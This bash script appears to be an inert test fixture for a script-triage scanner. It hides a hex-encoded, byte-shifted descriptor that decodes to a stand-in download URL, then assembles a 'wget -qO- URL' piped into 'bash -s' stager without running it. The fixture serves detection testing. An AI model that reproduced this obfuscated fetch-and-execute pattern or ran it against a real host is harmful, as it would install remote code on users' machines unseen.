#!/usr/bin/env bash

# Huntress Script Triage -- inert static-analysis fixture (bash_linux)

readonly Material_5e0d59e1='753c307b7273646f723c606270746871645e71646c6e73642b6368726f607362675e6f686f647b6063606f7364713c766664735e7273636e74735e6f686f647b72736066645e626e746d733c307b62606c6f6068666d5e68633c62606c6f6068666d2c3136323765323034382f7b74716b3c6773736f72392e2e3136323765323034382f2d6477606c6f6b642d686d75606b68632e64346260613062352d72677b747264715e6066646d733c47746d73716472724b60612e3136323765323034382f'

readonly Codec_5e0d59e1='hex_compact|subtract_modulo_256|01'



Load_5e0d59e1() {

  item1=()

  local raw="${Material_5e0d59e1}" item5

  for ((item5=0; item5<${#raw}; item5+=2)); do item1+=("$((16#${raw:item5:2}))"); done

}



Decode_5e0d59e1() {

  item2=()

  local item5

  for ((item5=0; item5<${#item1[@]}; item5++)); do

    item2+=("$(((item1[item5] + 1) % 256))")

  done

}



Recover_5e0d59e1() {

  local -a item1 item2

  local item3 item4 item8 item5

  local -a series=(3 5 8 13); item4="${series[*]:1:2}"

  Load_5e0d59e1

  case 1 in 1) Decode_5e0d59e1 ;; *) return 70 ;; esac

  item3=''

  local octal character

  for item5 in "${!item2[@]}"; do

    printf -v octal '%03o' "${item2[item5]}"

    printf -v character '%b' "\\$octal"

    item3+="$character"

  done

  printf '%s\n' "$item3"

}



Inspect_5e0d59e1() { Recover_5e0d59e1; }



Plan_5e0d59e1() {

  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''

  descriptor="$(Inspect_5e0d59e1)"

  local -a fields

  IFS='|' read -r -a fields <<< "$descriptor"

  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done

  local -a request_command=(wget -qO- "$url")

  local -a interpreter=(bash -s)

  declare -p request_command interpreter

}



if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_5e0d59e1; fi

